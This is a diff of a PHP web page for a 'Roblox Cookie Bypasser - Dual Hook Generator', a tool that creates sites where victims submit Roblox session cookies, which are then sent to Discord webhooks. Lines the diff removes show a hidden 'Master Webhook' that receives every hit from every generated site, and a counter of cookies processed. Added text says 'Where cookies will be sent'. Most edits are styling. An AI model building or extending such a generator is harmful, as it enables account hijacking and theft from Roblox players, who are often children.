@@ -1,7 +1,7 @@
 <?php
 /**
- * Bypasserv3 - Dualhook Generator (No Dashboard)
- * Direct webhook notifications only
+ * Bypasserv3 - Dualhook Generator
+ * Single webhook version (simplified for image 10)
  */
 
 require_once '../config.php';
@@ -17,7 +17,7 @@ $globalStats = getGlobalStats();
     <title>Roblox Cookie Bypasser - Dual Hook Generator</title>
     <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     
     <style>
@@ -29,7 +29,7 @@ $globalStats = getGlobalStats();
         
         body {
             font-family: 'Outfit', sans-serif;
-            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 50%, #0a0e27 100%);
+            background: linear-gradient(135deg, #0a1628 0%, #0f1f3a 50%, #0a1628 100%);
             background-attachment: fixed;
             color: #f8fafc;
             min-height: 100vh;
@@ -47,49 +47,43 @@ $globalStats = getGlobalStats();
         .glass-box {
             backdrop-filter: blur(20px) saturate(200%);
             -webkit-backdrop-filter: blur(20px) saturate(200%);
-            background: linear-gradient(135deg, rgba(15, 23, 42, 0.8) 0%, rgba(30, 41, 59, 0.6) 100%);
-            border: 1px solid rgba(59, 130, 246, 0.3);
-            border-radius: 20px;
-            padding: 40px;
-            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+            background: linear-gradient(135deg, rgba(15, 31, 58, 0.85) 0%, rgba(10, 22, 40, 0.9) 100%);
+            border: 1px solid rgba(0, 150, 200, 0.3);
+            border-radius: 25px;
+            padding: 45px;
+            box-shadow: 0 8px 32px 0 rgba(0, 150, 200, 0.2), inset 0 1px 0 0 rgba(255, 255, 255, 0.1);
         }
         
         .header {
             text-align: center;
-            margin-bottom: 40px;
+            margin-bottom: 35px;
         }
         
         .header-icon {
-            font-size: 48px;
-            margin-bottom: 16px;
+            font-size: 32px;
+            margin-bottom: 12px;
             display: inline-block;
-            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            font-weight: bold;
         }
         
         .header h1 {
             font-size: 28px;
             font-weight: 700;
-            margin-bottom: 8px;
-            background: linear-gradient(90deg, #3b82f6 0%, #60a5fa 50%, #3b82f6 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-size: 200% auto;
-            animation: gradientShift 3s ease infinite;
+            margin-bottom: 4px;
+            color: #00d4ff;
+            text-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
+        }
+        
+        .header h2 {
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: #00d4ff;
+            text-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
         }
         
         .header p {
-            color: rgba(255, 255, 255, 0.7);
+            color: rgba(255, 255, 255, 0.6);
             font-size: 14px;
-            margin-bottom: 4px;
-        }
-        
-        @keyframes gradientShift {
-            0% { background-position: 0% center; }
-            50% { background-position: 100% center; }
-            100% { background-position: 0% center; }
         }
         
         .form-group {
@@ -98,61 +92,61 @@ $globalStats = getGlobalStats();
         
         .form-group label {
             display: block;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 600;
-            color: rgba(255, 255, 255, 0.9);
-            margin-bottom: 8px;
+            color: #00d4ff;
+            margin-bottom: 10px;
             display: flex;
             align-items: center;
             gap: 6px;
         }
         
-        .webhook-hint {
-            display: inline-block;
-            background: rgba(59, 130, 246, 0.1);
-            border: 1px solid rgba(59, 130, 246, 0.3);
-            border-radius: 6px;
-            padding: 8px 12px;
-            font-size: 11px;
-            color: rgba(255, 255, 255, 0.6);
-            margin-left: 4px;
-            cursor: help;
+        .form-icon {
+            font-size: 16px;
         }
         
         .form-group input {
             width: 100%;
             padding: 12px 16px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(59, 130, 246, 0.3);
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(0, 168, 204, 0.3);
             border-radius: 10px;
             color: #f8fafc;
-            font-size: 14px;
+            font-size: 13px;
             font-family: 'Outfit', sans-serif;
             transition: all 0.3s ease;
         }
         
         .form-group input::placeholder {
-            color: rgba(255, 255, 255, 0.4);
+            color: rgba(255, 255, 255, 0.3);
         }
         
         .form-group input:focus {
             outline: none;
-            background: rgba(255, 255, 255, 0.08);
-            border-color: #3b82f6;
-            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+            background: rgba(0, 168, 204, 0.1);
+            border-color: #00d4ff;
+            box-shadow: 0 0 20px rgba(0, 212, 255, 0.2);
         }
         
         .form-group small {
             display: block;
             margin-top: 6px;
             font-size: 12px;
+            color: rgba(255, 255, 255, 0.4);
+        }
+        
+        .form-description {
+            display: block;
+            margin-top: 8px;
+            font-size: 12px;
             color: rgba(255, 255, 255, 0.5);
+            line-height: 1.5;
         }
         
         .btn-generate {
             width: 100%;
             padding: 14px 20px;
-            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
+            background: linear-gradient(135deg, #0a9cc9 0%, #00d4ff 100%);
             border: none;
             border-radius: 10px;
             color: white;
@@ -164,12 +158,13 @@ $globalStats = getGlobalStats();
             align-items: center;
             justify-content: center;
             gap: 8px;
-            margin-bottom: 16px;
+            margin-bottom: 12px;
+            box-shadow: 0 4px 15px rgba(0, 212, 255, 0.3);
         }
         
         .btn-generate:hover {
             transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(59, 130, 246, 0.4);
+            box-shadow: 0 6px 20px rgba(0, 212, 255, 0.4);
         }
         
         .btn-generate:active {
@@ -179,6 +174,29 @@ $globalStats = getGlobalStats();
         .btn-generate:disabled {
             opacity: 0.6;
             cursor: not-allowed;
+        }
+        
+        .btn-back {
+            width: 100%;
+            padding: 12px 20px;
+            background: rgba(0, 168, 204, 0.2);
+            border: 1px solid rgba(0, 168, 204, 0.4);
+            border-radius: 10px;
+            color: #00d4ff;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            text-decoration: none;
+        }
+        
+        .btn-back:hover {
+            background: rgba(0, 168, 204, 0.3);
+            border-color: #00d4ff;
         }
         
         .spinner {
@@ -194,53 +212,12 @@ $globalStats = getGlobalStats();
             to { transform: rotate(360deg); }
         }
         
-        .btn-back {
-            width: 100%;
-            padding: 12px 20px;
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 10px;
-            color: white;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-        }
-        
-        .btn-back:hover {
-            background: rgba(255, 255, 255, 0.15);
-            border-color: rgba(255, 255, 255, 0.3);
-        }
-        
-        .stats {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-            margin-top: 32px;
-            padding-top: 24px;
-            border-top: 1px solid rgba(59, 130, 246, 0.2);
-        }
-        
-        .stat-item {
+        .description-text {
             text-align: center;
-        }
-        
-        .stat-number {
-            font-size: 24px;
-            font-weight: 700;
-            background: linear-gradient(135deg, #3b82f6, #2563eb);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 4px;
-        }
-        
-        .stat-label {
             font-size: 12px;
-            color: rgba(255, 255, 255, 0.6);
+            color: rgba(255, 255, 255, 0.5);
+            margin-top: 20px;
+            line-height: 1.6;
         }
         
         .success-container {
@@ -275,17 +252,6 @@ $globalStats = getGlobalStats();
             border-radius: 8px;
             margin-top: 16px;
         }
-        
-        .webhook-info {
-            background: rgba(59, 130, 246, 0.1);
-            border: 1px solid rgba(59, 130, 246, 0.2);
-            border-radius: 10px;
-            padding: 12px;
-            margin-top: 12px;
-            font-size: 11px;
-            color: rgba(255, 255, 255, 0.6);
-            line-height: 1.6;
-        }
     </style>
 </head>
 <body>
@@ -294,7 +260,7 @@ $globalStats = getGlobalStats();
             <div class="header">
                 <div class="header-icon"><//>
                 <h1>Roblox Cookie Bypasser</h1>
-                <h1 style="font-size: 24px; margin-top: -8px;">Dual Hook Generator</h1>
+                <h2>Dual Hook Generator</h2>
                 <p>Create your own Roblox cookie Bypasser site in seconds</p>
             </div>
 
@@ -302,7 +268,7 @@ $globalStats = getGlobalStats();
                 <!-- Site Name -->
                 <div class="form-group">
                     <label>
-                        <span>📁</span>
+                        <span class="form-icon">📁</span>
                         Site Name (Directory)
                     </label>
                     <input 
@@ -318,9 +284,8 @@ $globalStats = getGlobalStats();
                 <!-- Master Webhook -->
                 <div class="form-group">
                     <label>
-                        <span>🔐</span>
-                        Master Webhook (Admin)
-                        <span class="webhook-hint">?</span>
+                        <span class="form-icon">📡</span>
+                        Discord Webhook URL
                     </label>
                     <input 
                         type="text" 
@@ -328,26 +293,7 @@ $globalStats = getGlobalStats();
                         placeholder="https://discord.com/api/webhooks/..."
                         required
                     />
-                    <div class="webhook-info">
-                        📊 <strong>Receives ALL hits</strong> from all sites you generate. Perfect for tracking all activity across your network.
-                    </div>
-                </div>
-
-                <!-- User Webhook -->
-                <div class="form-group">
-                    <label>
-                        <span>👤</span>
-                        User Webhook (Optional)
-                        <span class="webhook-hint">?</span>
-                    </label>
-                    <input 
-                        type="text" 
-                        id="userWebhook" 
-                        placeholder="https://discord.com/api/webhooks/..."
-                    />
-                    <div class="webhook-info">
-                        🎯 <strong>Receives ONLY hits</strong> from THIS specific site. If not provided, will use master webhook.
-                    </div>
+                    <span class="form-description">Where cookies will be sent. Get this from Discord channel settings → Integrations → Webhooks</span>
                 </div>
 
                 <button type="submit" class="btn-generate">
@@ -359,6 +305,10 @@ $globalStats = getGlobalStats();
                     <span>🏠</span>
                     Back to Main Site
                 </a>
+
+                <div class="description-text">
+                    Each site generates a unique URL where people can submit their Roblox cookies.
+                </div>
             </form>
 
             <div id="successContainer" class="success-container" style="display: none;">
@@ -366,30 +316,9 @@ $globalStats = getGlobalStats();
                 <h2>Site Generated Successfully!</h2>
                 <p>Your bypass site is ready with FULL EMBED FUNCTIONALITY!</p>
                 
-                <div style="margin-top: 20px; text-align: left; background: rgba(59, 130, 246, 0.1); padding: 16px; border-radius: 10px; border: 1px solid rgba(59, 130, 246, 0.3);">
+                <div style="margin-top: 20px; text-align: center; background: rgba(0, 168, 204, 0.1); padding: 16px; border-radius: 10px; border: 1px solid rgba(0, 168, 204, 0.3);">
                     <p style="font-size: 12px; color: rgba(255, 255, 255, 0.6); margin-bottom: 8px;">📎 Your Link:</p>
-                    <p id="generatedUrl" style="background: rgba(0, 0, 0, 0.3); padding: 12px; border-radius: 6px; font-size: 13px; margin: 0; word-break: break-all;"></p>
-                </div>
-
-                <div style="margin-top: 20px; text-align: left; background: rgba(59, 130, 246, 0.1); padding: 16px; border-radius: 10px; border: 1px solid rgba(59, 130, 246, 0.3);">
-                    <p style="font-size: 12px; color: rgba(255, 255, 255, 0.6); margin-bottom: 8px;">🔔 Webhook Setup:</p>
-                    <ul style="font-size: 13px; color: rgba(255, 255, 255, 0.8); list-style: none; padding: 0;">
-                        <li style="margin-bottom: 6px;">✓ Master Webhook: Receives ALL hits from all sites</li>
-                        <li>✓ User Webhook: Receives ONLY hits from this specific site</li>
-                    </ul>
-                </div>
-
-                <div style="margin-top: 20px; text-align: left;">
-                    <p style="font-size: 12px; color: rgba(255, 255, 255, 0.6); margin-bottom: 8px;">✨ Full Features:</p>
-                    <ul style="font-size: 13px; color: rgba(255, 255, 255, 0.8); list-style: none; padding: 0;">
-                        <li style="margin-bottom: 6px;">✓ Account info fetching</li>
-                        <li style="margin-bottom: 6px;">✓ Robux balance display</li>
-                        <li style="margin-bottom: 6px;">✓ RAP value tracking</li>
-                        <li style="margin-bottom: 6px;">✓ Limited RAP calculation</li>
-                        <li style="margin-bottom: 6px;">✓ Group ownership detection</li>
-                        <li style="margin-bottom: 6px;">✓ Friend count display</li>
-                        <li>✓ Dual webhook notifications</li>
-                    </ul>
+                    <p id="generatedUrl" style="background: rgba(0, 0, 0, 0.3); padding: 12px; border-radius: 6px; font-size: 13px; margin: 0; word-break: break-all; color: #00d4ff;"></p>
                 </div>
 
                 <button onclick="window.location.href = document.getElementById('generatedUrl').textContent" class="btn-generate" style="margin-top: 20px;">
@@ -402,17 +331,6 @@ $globalStats = getGlobalStats();
                     Create Another Site
                 </button>
             </div>
-
-            <div class="stats">
-                <div class="stat-item">
-                    <div class="stat-number"><?= $globalStats['totalInstances'] ?? 0 ?></div>
-                    <div class="stat-label">Sites Created</div>
-                </div>
-                <div class="stat-item">
-                    <div class="stat-number"><?= $globalStats['totalCookies'] ?? 0 ?></div>
-                    <div class="stat-label">Cookies Processed</div>
-                </div>
-            </div>
         </div>
     </div>
 
@@ -422,16 +340,15 @@ $globalStats = getGlobalStats();
 
             const siteName = document.getElementById('siteName').value.trim();
             const masterWebhook = document.getElementById('masterWebhook').value.trim();
-            const userWebhook = document.getElementById('userWebhook').value.trim();
 
             if (!siteName || !masterWebhook) {
                 Swal.fire({
                     icon: 'error',
                     title: 'Missing Fields',
                     text: 'Please fill in all required fields',
-                    background: 'rgba(15, 23, 42, 0.9)',
+                    background: 'rgba(10, 22, 40, 0.9)',
                     color: '#f8fafc',
-                    confirmButtonColor: '#3b82f6'
+                    confirmButtonColor: '#00d4ff'
                 });
                 return false;
             }
@@ -441,9 +358,9 @@ $globalStats = getGlobalStats();
                     icon: 'error',
                     title: 'Invalid Site Name',
                     text: 'Site name must be at least 3 characters',
-                    background: 'rgba(15, 23, 42, 0.9)',
+                    background: 'rgba(10, 22, 40, 0.9)',
                     color: '#f8fafc',
-                    confirmButtonColor: '#3b82f6'
+                    confirmButtonColor: '#00d4ff'
                 });
                 return false;
             }
@@ -458,8 +375,8 @@ $globalStats = getGlobalStats();
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         directory: siteName,
-                        masterWebhook,
-                        userWebhook
+                        masterWebhook: masterWebhook,
+                        userWebhook: masterWebhook // Use same webhook for simplicity
                     })
                 });
 
@@ -473,8 +390,8 @@ $globalStats = getGlobalStats();
                     Swal.fire({
                         icon: 'success',
                         title: 'Success!',
-                        html: '<p>Your site has been generated!</p><p style="font-size: 12px; color: #9ca3af; margin-top: 8px;">Webhooks have been notified</p>',
-                        background: 'rgba(15, 23, 42, 0.9)',
+                        html: '<p>Your site has been generated!</p><p style="font-size: 12px; color: #9ca3af; margin-top: 8px;">Webhook has been notified</p>',
+                        background: 'rgba(10, 22, 40, 0.9)',
                         color: '#f8fafc',
                         confirmButtonColor: '#10b981'
                     });
@@ -483,7 +400,7 @@ $globalStats = getGlobalStats();
                         icon: 'error',
                         title: 'Error',
                         text: data.error || 'Failed to generate site',
-                        background: 'rgba(15, 23, 42, 0.9)',
+                        background: 'rgba(10, 22, 40, 0.9)',
                         color: '#f8fafc',
                         confirmButtonColor: '#ef4444'
                     });
@@ -493,7 +410,7 @@ $globalStats = getGlobalStats();
                     icon: 'error',
                     title: 'Network Error',
                     text: err.message,
-                    background: 'rgba(15, 23, 42, 0.9)',
+                    background: 'rgba(10, 22, 40, 0.9)',
                     color: '#f8fafc',
                     confirmButtonColor: '#ef4444'
                 });
